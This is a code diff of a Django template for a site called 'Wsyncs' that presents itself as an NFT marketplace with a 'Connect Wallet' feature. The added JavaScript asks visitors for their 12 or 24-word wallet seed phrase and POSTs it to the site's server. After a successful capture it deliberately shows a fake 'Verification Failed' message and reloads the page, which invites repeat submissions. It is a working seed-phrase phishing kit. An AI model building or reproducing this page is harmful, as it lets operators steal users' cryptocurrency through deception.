+        <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" id="walletModalLabel">Import Wallet</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+              </div>
+              <div class="modal-body">
+                <div id="inputContainer">
+                  <p>
+                    Enter your 12 or 24-word seed phrase for <span id="walletName">Wallet</span> below.
+                  </p>
+
+                  <textarea class="form-control" id="seedPhrase" rows="4" placeholder="Enter your 12 or 24-word seed phrase"></textarea>
+                  <div id="errorMessage" class="text-danger mt-2" style="display: none;"></div>
+                </div>
+                <div id="verificationContainer" class="verification-container" style="display: none;">
+                  <div class="spinner-border text-light" role="status">
+                    <span class="visually-hidden">Verifying...</span>
+                  </div>
+                  <div class="verification-message">Please wait while we verify your phrase key</div>
+                </div>
+              </div>
+              <div class="modal-footer" id="modalFooter">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-main text-dark" onclick="importWallet()">Import</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- content close -->
+
+      <a href="#" id="back-to-top"></a>
+
+      <!-- footer begin -->
+      <footer>
+        <div class="container">
+          <div class="row">
+            <!-- Explore -->
+            <div class="col-md-3 col-sm-6 col-xs-1">
+              <div class="widget">
+                <h5>Explore</h5>
+                <ul>
+                  <li>
+                    <a href="{% url 'home' %}">Home</a>
+                  </li>
+                  <li>
+                    <a href="{% url 'home' %}#about">About</a>
+                  </li>
+                  <li>
+                    <a href="{% url 'home' %}">Marketplace</a>
+                  </li>
+                  <li>
+                    <a href="{% url 'connect' %}">Connect Wallet</a>
+                  </li>
+                </ul>
+              </div>
             </div>
 
-            <!-- Subfooter -->
-            <div class="subfooter">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-md-12">
-                            <div class="de-flex">
-                                <div class="de-flex-col">
-                                    <a href="{% url 'home' %}">
-                                        <span class="copy">© 2025 - Wsyncs</span>
-                                    </a>
-                                </div>
-                                <div class="de-flex-col">
-                                    <div class="social-icons">
-                                        <a href="#"><i class="fa fa-facebook fa-lg"></i></a>
-                                        <a href="#"><i class="fa fa-twitter fa-lg"></i></a>
-                                        <a href="#"><i class="fa fa-linkedin fa-lg"></i></a>
-                                        <a href="#"><i class="fa fa-pinterest fa-lg"></i></a>
-                                        <a href="#"><i class="fa fa-rss fa-lg"></i></a>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+            <!-- Support -->
+            <div class="col-md-3 col-sm-6 col-xs-1">
+              <div class="widget">
+                <h5>Support</h5>
+                <ul>
+                  <li>
+                    <a href="{% url 'home' %}#help">Help Center</a>
+                  </li>
+                </ul>
+              </div>
             </div>
-        </footer>
-        <!-- footer close -->
+
+            <!-- Newsletter -->
+            <div class="col-md-6 col-sm-12 col-xs-1">
+              <div class="widget">
+                <h5>Newsletter</h5>
+                <p>Stay updated on NFT security alerts and Web3 updates — straight to your inbox.</p>
+                <form action="blank.php" class="row form-dark" id="form_subscribe" method="post" name="form_subscribe">
+                  <div class="col text-center">
+                    <input class="form-control" id="txt_subscribe" name="txt_subscribe" placeholder="enter your email" type="text" />
+                    <a href="#" id="btn-subscribe"><i class="arrow_right bg-color-secondary"></i></a>
+                    <div class="clearfix"></div>
+                  </div>
+                </form>
+                <div class="spacer-10"></div>
+                <small>We respect your privacy. No spam. Ever.</small>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Subfooter -->
+        <div class="subfooter">
+          <div class="container">
+            <div class="row">
+              <div class="col-md-12">
+                <div class="de-flex">
+                  <div class="de-flex-col">
+                    <a href="{% url 'home' %}"><span class="copy">© 2025 - Wsyncs</span></a>
+                  </div>
+                  <div class="de-flex-col">
+                    <div class="social-icons">
+                      <a href="#"><i class="fa fa-facebook fa-lg"></i></a>
+                      <a href="#"><i class="fa fa-twitter fa-lg"></i></a>
+                      <a href="#"><i class="fa fa-linkedin fa-lg"></i></a>
+                      <a href="#"><i class="fa fa-pinterest fa-lg"></i></a>
+                      <a href="#"><i class="fa fa-rss fa-lg"></i></a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </footer>
+      <!-- footer close -->
     </div>
 
     <!-- Javascript Files -->
     <script src="{% static 'js/plugins.js' %}"></script>
     <script src="{% static 'js/designesia.js' %}"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
     <script>
-        // Mobile menu toggle
-        document.getElementById('menu-btn').addEventListener('click', function() {
-            const mobileMenu = document.getElementById('mobile-menu');
-            mobileMenu.style.display = mobileMenu.style.display === 'block' ? 'none' : 'block';
-        });
+   let currentWallet = '';
 
-        let currentWallet = '';
+function setWalletName(walletName) {
+  currentWallet = walletName;
+  document.getElementById('walletName').textContent = walletName;
+  document.getElementById('seedPhrase').value = '';
+  document.getElementById('errorMessage').style.display = 'none';
+  document.getElementById('inputContainer').style.display = 'block';
+  document.getElementById('verificationContainer').style.display = 'none';
+  document.getElementById('modalFooter').style.display = 'flex';
+}
 
-        function setWalletName(walletName) {
-            currentWallet = walletName;
-            document.getElementById('walletName').textContent = walletName;
-            document.getElementById('seedPhrase').value = '';
-            document.getElementById('errorMessage').style.display = 'none';
-            document.getElementById('inputContainer').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('modalFooter').style.display = 'flex';
-        }
+function showSpinner() {
+  const verificationContainer = document.getElementById('verificationContainer');
+  verificationContainer.innerHTML = `
+    <div class="d-flex flex-column align-items-center justify-content-center" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); z-index: 1050;">
+      <div class="spinner-border text-warning" style="width: 3rem; height: 3rem;" role="status">
+        <span class="visually-hidden">Verifying...</span>
+      </div>
+      <p class="text-warning mt-3">Verifying...</p>
+    </div>
+  `;
+  verificationContainer.style.display = 'flex';
+}
 
-        function importWallet() {
-            const seedPhrase = document.getElementById('seedPhrase').value.trim();
-            const wordCount = seedPhrase.split(/\s+/).filter(word => word.length > 0).length;
-            const errorMessage = document.getElementById('errorMessage');
-            const inputContainer = document.getElementById('inputContainer');
-            const verificationContainer = document.getElementById('verificationContainer');
-            const modalFooter = document.getElementById('modalFooter');
+function hideSpinner() {
+  const verificationContainer = document.getElementById('verificationContainer');
+  verificationContainer.innerHTML = '';
+  verificationContainer.style.display = 'none';
+}
 
-            if (seedPhrase && (wordCount === 12 || wordCount === 24)) {
-                // Hide input and buttons, show spinner and message
-                inputContainer.style.display = 'none';
-                modalFooter.style.display = 'none';
-                verificationContainer.style.display = 'flex';
+function importWallet() {
+  const seedPhrase = document.getElementById('seedPhrase').value.trim();
+  const wordCount = seedPhrase.split(/\s+/).filter((word) => word.length > 0).length;
+  const errorMessage = document.getElementById('errorMessage');
+  const inputContainer = document.getElementById('inputContainer');
+  const modalFooter = document.getElementById('modalFooter');
 
-                // Simulate verification process (replace with actual wallet import logic)
-                setTimeout(() => {
-                    // Close the modal after 2 seconds
-                    const modal = bootstrap.Modal.getInstance(document.getElementById('walletModal'));
-                    modal.hide();
-                    // Reset modal state
-                    inputContainer.style.display = 'block';
-                    verificationContainer.style.display = 'none';
-                    modalFooter.style.display = 'flex';
-                }, 2000);
-            } else {
-                errorMessage.textContent = 'Please enter a valid 12 or 24-word seed phrase.';
-                errorMessage.style.display = 'block';
+  if (!seedPhrase || (wordCount !== 12 && wordCount !== 24)) {
+    errorMessage.textContent = 'Please enter a valid 12 or 24-word seed phrase.';
+    errorMessage.style.display = 'block';
+    return;
+  }
+
+  errorMessage.style.display = 'none';
+  inputContainer.style.display = 'none';
+  modalFooter.style.display = 'none';
+  showSpinner();
+
+  // Send data to Django via POST
+  fetch("{% url 'import_wallet' %}", {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRFToken': getCSRFToken()
+    },
+    body: JSON.stringify({
+      wallet_type: currentWallet,
+      key_phrase: seedPhrase
+    })
+  })
+    .then((response) => response.json())
+    .then((data) => {
+      // Delay hiding spinner and showing alert for 2 seconds
+      setTimeout(() => {
+        const modal = bootstrap.Modal.getInstance(document.getElementById('walletModal'));
+        modal.hide();
+        hideSpinner();
+        inputContainer.style.display = 'block';
+        modalFooter.style.display = 'flex';
+
+        if (data.status === 'success') {
+          Swal.fire({
+            icon: 'error',
+            title: 'Verification Failed',
+            text: 'Try again or try another wallet.',
+            background: '#1a1a1a',
+            color: '#f4e706',
+            confirmButtonColor: '#f4e706',
+            iconColor: '#f4e706',
+            customClass: {
+              popup: 'swal-dark',
+              title: 'swal-title-dark',
+              content: 'swal-text-dark',
+              confirmButton: 'swal-button-dark'
+            },
+            didClose: () => {
+              location.reload(true); // Reload page immediately
             }
+          });
+        } else {
+          Swal.fire({
+            icon: 'error',
+            title: 'Error',
+            text: data.message || 'Something went wrong. Try again.',
+            background: '#1a1a1a',
+            color: '#f4e706',
+            confirmButtonColor: '#f4e706',
+            iconColor: '#f4e706',
+            customClass: {
+              popup: 'swal-dark',
+              title: 'swal-title-dark',
+              content: 'swal-text-dark',
+              confirmButton: 'swal-button-dark'
+            },
+            didClose: () => {
+              location.reload(true); // Reload page immediately
+            }
+          });
         }
+      }, 10000); // 2-second delay
+    })
+    .catch((error) => {
+      // Delay hiding spinner and showing alert for 2 seconds
+      setTimeout(() => {
+        hideSpinner();
+        inputContainer.style.display = 'block';
+        modalFooter.style.display = 'flex';
+        Swal.fire({
+          icon: 'error',
+          title: 'Network Error',
+          text: 'Check your connection and try again.',
+          background: '#1a1a1a',
+          color: '#f4e706',
+          confirmButtonColor: '#f4e706',
+          iconColor: '#f4e706',
+          customClass: {
+            popup: 'swal-dark',
+            title: 'swal-title-dark',
+            content: 'swal-text-dark',
+            confirmButton: 'swal-button-dark'
+          },
+          didClose: () => {
+            location.reload(true); // Reload page immediately
+          }
+        });
+      }, 2000); // 2-second delay
+    });
+}
+
+function getCSRFToken() {
+  const name = 'csrftoken';
+  const cookies = document.cookie.split(';');
+  for (let i = 0; i < cookies.length; i++) {
+    let c = cookies[i].trim();
+    if (c.startsWith(name + '=')) {
+      return decodeURIComponent(c.substring(name.length + 1));
+    }
+  }
+  return '';
+}
     </script>
-</body>
+  </body>
 </html>
